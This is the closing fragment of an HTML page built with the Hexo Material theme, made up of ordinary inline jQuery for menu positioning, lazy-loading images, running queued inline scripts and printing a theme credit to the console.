        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
    });
</script>

<!-- MathJax Load-->

<script type="text/ls-javascript" id="lazy-load">
    // Offer LazyLoad
    queue.offer(function(){
        $('.lazy').lazyload({
            effect : 'show'
        });
    });

    // Start Queue
    $(document).ready(function(){
        setInterval(function(){
            queue.execNext();
        },200);
    });
</script>

<!-- Bing Background -->


<script>
    (function(){
        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')

        for (var i = 0; i < scriptList.length; ++i) {
            var item = scriptList[i];
            lsloader.runInlineScript(item.id,item.id);
        }
    })()
console.log('\n %c © Material Theme | Version: 1.4.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
</script>

                </main>
            </div>
        </body>
    
</html>
